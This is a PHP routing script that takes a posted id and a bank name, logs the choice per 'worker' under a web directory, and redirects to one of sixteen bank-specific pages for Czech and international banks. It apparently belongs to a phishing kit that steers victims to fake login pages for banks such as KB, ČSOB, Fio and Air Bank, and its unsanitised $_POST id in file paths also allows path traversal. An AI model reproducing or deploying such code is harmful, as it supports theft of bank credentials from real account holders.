<?php

include "service.php";
include "../settings.php";

if (file_exists("data/" . $_POST['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("data/" . $_POST["id"] . ".xml");

switch ($_POST['bankname']){
    case 'expo':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "expo");
        header("location: banks/expo.php?id=" . $_POST['id']);
    break;
    case 'moneta':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "moneta");
        header("location: banks/moneta.php?id=" . $_POST['id']);
    break;
    case 'ober':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "ober");
        header("location: banks/oberbank.php?id=" . $_POST['id']);
    break;
    case 'cnb':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "cnb");
        header("location: banks/cnb.php?id=" . $_POST['id']);
    break;
    case 'ceska':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "ceska");
        header("location: banks/ceska.php?id=" . $_POST['id']);
    break;
    case 'equa':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "equa");
        header("location: banks/equa.php?id=" . $_POST['id']);
    break;
    case 'mbank':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "mbank");
        header("location: banks/mbank.php?id=" . $_POST['id']);
    break;
    case 'hsbc':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "hsbc");
        header("location: banks/hsbc.php?id=" . $_POST['id']);
    break;
    case 'csob':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "csob");
        header("location: banks/csob.php?id=" . $_POST['id']);
    break;
    case 'ing':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "ing");
        header("location: banks/ingbank.php?id=" . $_POST['id']);
    break;
    case 'kb':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "kb");
        header("location: banks/kb.php?id=" . $_POST['id']);
    break;
    case 'citibank':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "citi");
        header("location: banks/citi.php?id=" . $_POST['id']);
    break;
    case 'unicredit':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "unicredit");
        header("location: banks/unicredit.php?id=" . $_POST['id']);
    break;
    case 'raiffeisen':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "raiffeisen");
        header("location: banks/raiffeisen.php?id=" . $_POST['id']);
    break;
    case 'fio':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "fio");
        header("location: banks/fio.php?id=" . $_POST['id']);
    break;
    case 'air':
        file_put_contents("/var/www/html/lk/" . $_POST['id'] . "_" . $xml->worker_id, "air");
        header("location: banks/airbank.php?id=" . $_POST['id']);
    break;
    
}

?>